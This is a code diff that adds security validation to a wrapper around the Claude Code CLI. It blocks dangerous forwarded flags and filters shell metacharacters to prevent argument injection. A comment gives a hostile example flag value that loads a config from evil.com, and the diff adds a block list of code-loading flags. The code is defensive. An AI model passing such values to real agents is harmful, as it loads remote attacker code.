@@ -99,6 +99,246 @@ function sanitizeSystemPrompt(prompt: string): string {
 }
 
 /**
+ * Security: Flags that cannot be forwarded due to security risks (CWE-88: Argument Injection)
+ *
+ * These flags can load external code, access sensitive directories, or modify agent behavior.
+ * Users should configure these settings using agentConfig in their code instead.
+ *
+ * Rationale:
+ * - We use spawn() with array args (not exec), which prevents shell injection (CWE-78)
+ * - But malicious FLAG VALUES can still be processed by Claude Code CLI
+ * - Example: --mcp-config=https://evil.com/malicious.json loads external code
+ *
+ * Defense Strategy: Blacklist dangerous flags + validate flag structure
+ * - Allows future Claude Code flags to work automatically
+ * - Only blocks specific high-risk flags
+ * - Clear error messages guide users to safe alternatives
+ */
+const DANGEROUS_FORWARDED_FLAGS = new Set([
+  'mcp-config',         // Load external MCP servers (RCE risk)
+  'add-dir',            // Grant access to arbitrary directories
+  'settings',           // Load external settings (RCE risk)
+  'plugin-dir',         // Load external plugins (RCE risk)
+  'system-prompt',      // Use agentConfig.appendSystemPrompt instead
+  'session-id',         // Session management should be internal
+  'agents',             // Agent definitions should be in config
+]);
+
+/**
+ * Security: Validate flag name format
+ * Flag names must be alphanumeric with hyphens and underscores
+ */
+const FLAG_NAME_REGEX = /^[a-zA-Z][a-zA-Z0-9_-]*$/;
+
+/**
+ * Security: Dangerous characters in flag values
+ * Block shell metacharacters that could be used for injection attacks
+ */
+const DANGEROUS_VALUE_CHARS = /[;&|`$\\<>(){}[\]!*?]/;
+
+/**
+ * Security: Validate flag structure to prevent injection
+ *
+ * Validates that a flag follows expected format and doesn't contain dangerous patterns.
+ * This is Layer 1 of defense (syntactic validation).
+ *
+ * @param flag - The flag to validate (e.g., "--model=sonnet" or "--debug")
+ * @returns Result with validated flag or validation error
+ */
+function validateFlagStructure(flag: string): Result<string, ValidationError> {
+  // Must start with - or --
+  if (!flag.startsWith('-')) {
+    return new Err(
+      new ValidationError(
+        `Flag must start with - or --: "${flag}"`,
+        'INVALID_FLAG_FORMAT',
+        { flag }
+      )
+    );
+  }
+
+  // Split into name and value (handle both --flag and --flag=value)
+  const parts = flag.replace(/^-+/, '').split('=', 2);
+  const flagName = parts[0];
+  const flagValue = parts[1];
+
+  // Validate flag name format (alphanumeric with hyphens/underscores)
+  if (!FLAG_NAME_REGEX.test(flagName)) {
+    return new Err(
+      new ValidationError(
+        `Invalid flag name: "${flagName}". Must be alphanumeric with hyphens/underscores.`,
+        'INVALID_FLAG_NAME',
+        { flag: flagName }
+      )
+    );
+  }
+
+  // If flag has a value (--flag=value), validate it doesn't contain dangerous characters
+  if (flagValue !== undefined && DANGEROUS_VALUE_CHARS.test(flagValue)) {
+    return new Err(
+      new ValidationError(
+        `Flag value contains dangerous characters: "${flagValue}". ` +
+        `Shell metacharacters (;&|` + '`$\\<>(){}[]!*?) are not allowed.',
+        'INVALID_FLAG_VALUE',
+        { flag: flagName, value: flagValue }
+      )
+    );
+  }
+
+  return new Ok(flag);
+}
+
+/**
+ * Security: Check if flag is blacklisted
+ *
+ * Blocks specific high-risk flags that can load external code or access sensitive resources.
+ * This is Layer 2 of defense (semantic validation).
+ *
+ * @param flag - The flag to check (e.g., "--model=sonnet")
+ * @returns Result with flag or validation error if blacklisted
+ */
+function checkFlagBlacklist(flag: string): Result<string, ValidationError> {
+  // Extract flag name (handle both --flag and --flag=value)
+  const flagName = flag.replace(/^-+/, '').split('=')[0];
+
+  if (DANGEROUS_FORWARDED_FLAGS.has(flagName)) {
+    return new Err(
+      new ValidationError(
+        `Flag --${flagName} cannot be forwarded for security reasons. ` +
+        `Configure this setting using agentConfig in your code instead. ` +
+        `See documentation for agent configuration options.`,
+        'DANGEROUS_FLAG',
+        {
+          flag: flagName,
+          suggestion: `Use agentConfig in your .ai file instead of --${flagName}`
+        }
+      )
+    );
+  }
+
+  return new Ok(flag);
+}
+
+/**
+ * Security: Validate all forwarded flags
+ *
+ * Applies two layers of validation:
+ * 1. Structure validation: Ensures flags follow expected format
+ * 2. Blacklist check: Blocks specific dangerous flags
+ *
+ * @param flags - Array of flags to validate
+ * @returns Result with validated flags array or first validation error
+ */
+function validateForwardedFlags(flags: string[]): Result<string[], ValidationError> {
+  const validated: string[] = [];
+
+  for (const flag of flags) {
+    // Layer 1: Validate flag structure (syntactic security)
+    const structureResult = validateFlagStructure(flag);
+    if (structureResult.ok === false) {
+      return new Err(structureResult.error);
+    }
+
+    // Layer 2: Check blacklist (semantic security)
+    const blacklistResult = checkFlagBlacklist(flag);
+    if (blacklistResult.ok === false) {
+      return new Err(blacklistResult.error);
+    }
+
+    validated.push(flag);
+  }
+
+  return new Ok(validated);
+}
+
+/**
+ * Build command-line arguments for Claude Code CLI
+ *
+ * Pure function extracted for testability. Handles:
+ * - Base arguments (prompt, output format, permissions)
+ * - Agent configuration (model, tools, system prompt)
+ * - Flag forwarding with security validation
+ *
+ * @param prompt - The prompt to pass to Claude Code
+ * @param options - Invocation options including config and forwarded flags
+ * @returns Array of command-line arguments for spawn()
+ * @throws Error if validation fails for model, tools, or forwarded flags
+ */
+export function buildClaudeArguments(
+  prompt: string,
+  options: InvokeOptions
+): string[] {
+  const args = [
+    '-p', // Print mode (headless, already non-interactive)
+    prompt,
+    '--output-format', 'stream-json', // Stream output in real-time
+    '--verbose', // Required for stream-json with --print
+    '--dangerously-skip-permissions', // Skip all permission prompts for fully unattended execution
+  ];
+
+  // Add agent-specific configuration with security validation
+  if (options.agentConfig) {
+    const config = options.agentConfig as Record<string, unknown>;
+
+    // Security: Validate model name against whitelist
+    if (config.model) {
+      const modelResult = validateModel(String(config.model));
+      if (modelResult.ok === false) {
+        throw new Error(modelResult.error.message);
+      }
+      args.push('--model', modelResult.value);
+    }
+
+    // Security: Validate tool list format
+    if (config.allowedTools) {
+      const toolsResult = validateToolList(String(config.allowedTools));
+      if (toolsResult.ok === false) {
+        throw new Error(toolsResult.error.message);
+      }
+      args.push('--allowedTools', toolsResult.value);
+    }
+
+    // Security: Validate tool list format
+    if (config.disallowedTools) {
+      const toolsResult = validateToolList(String(config.disallowedTools));
+      if (toolsResult.ok === false) {
+        throw new Error(toolsResult.error.message);
+      }
+      args.push('--disallowedTools', toolsResult.value);
+    }
+
+    // Security: Sanitize system prompt
+    if (config.appendSystemPrompt) {
+      const sanitizedPrompt = sanitizeSystemPrompt(String(config.appendSystemPrompt));
+      args.push('--append-system-prompt', sanitizedPrompt);
+    }
+
+    // Security: Validate fallback model name against whitelist
+    if (config.fallbackModel) {
+      const modelResult = validateModel(String(config.fallbackModel));
+      if (modelResult.ok === false) {
+        throw new Error(modelResult.error.message);
+      }
+      args.push('--fallback-model', modelResult.value);
+    }
+  }
+
+  // Security: Validate and forward unknown flags to Claude Code CLI
+  // These flags were passed to dot.ai but not recognized by our CLI parser
+  // This allows future-proofing as Claude Code adds new flags
+  // Defense: Two-layer validation (structure + blacklist) prevents argument injection (CWE-88)
+  if (options.forwardedFlags && options.forwardedFlags.length > 0) {
+    const validationResult = validateForwardedFlags(options.forwardedFlags);
+    if (validationResult.ok === false) {
+      throw new Error(validationResult.error.message);
+    }
+    args.push(...validationResult.value);
+  }
+
+  return args;
+}
+
+/**
  * Tool information for buffered display
  */
 interface ToolInfo {
@@ -219,72 +459,10 @@ export class ClaudeCodeAgent implements CodingAgent {
 
   /**
    * Build command-line arguments for claude command
-   * Extracted from runClaudeCode for better testability and maintainability
+   * Delegates to buildClaudeArguments pure function for better testability
    */
   private buildArguments(prompt: string, options: InvokeOptions): string[] {
-    const args = [
-      '-p', // Print mode (headless, already non-interactive)
-      prompt,
-      '--output-format', 'stream-json', // Stream output in real-time
-      '--verbose', // Required for stream-json with --print
-      '--dangerously-skip-permissions', // Skip all permission prompts for fully unattended execution
-    ];
-
-    // Add agent-specific configuration with security validation
-    if (options.agentConfig) {
-      const config = options.agentConfig as Record<string, unknown>;
-
-      // Security: Validate model name against whitelist
-      if (config.model) {
-        const modelResult = validateModel(String(config.model));
-        if (modelResult.ok === false) {
-          throw new Error(modelResult.error.message);
-        }
-        args.push('--model', modelResult.value);
-      }
-
-      // Security: Validate tool list format
-      if (config.allowedTools) {
-        const toolsResult = validateToolList(String(config.allowedTools));
-        if (toolsResult.ok === false) {
-          throw new Error(toolsResult.error.message);
-        }
-        args.push('--allowedTools', toolsResult.value);
-      }
-
-      // Security: Validate tool list format
-      if (config.disallowedTools) {
-        const toolsResult = validateToolList(String(config.disallowedTools));
-        if (toolsResult.ok === false) {
-          throw new Error(toolsResult.error.message);
-        }
-        args.push('--disallowedTools', toolsResult.value);
-      }
-
-      // Security: Sanitize system prompt
-      if (config.appendSystemPrompt) {
-        const sanitizedPrompt = sanitizeSystemPrompt(String(config.appendSystemPrompt));
-        args.push('--append-system-prompt', sanitizedPrompt);
-      }
-
-      // Security: Validate fallback model name against whitelist
-      if (config.fallbackModel) {
-        const modelResult = validateModel(String(config.fallbackModel));
-        if (modelResult.ok === false) {
-          throw new Error(modelResult.error.message);
-        }
-        args.push('--fallback-model', modelResult.value);
-      }
-    }
-
-    // Forward unknown flags to Claude Code CLI
-    // These flags were passed to dot.ai but not recognized by our CLI parser
-    // This allows future-proofing as Claude Code adds new flags
-    if (options.forwardedFlags && options.forwardedFlags.length > 0) {
-      args.push(...options.forwardedFlags);
-    }
-
-    return args;
+    return buildClaudeArguments(prompt, options);
   }
 
   private async runClaudeCode(prompt: string, options: InvokeOptions): Promise<string> {
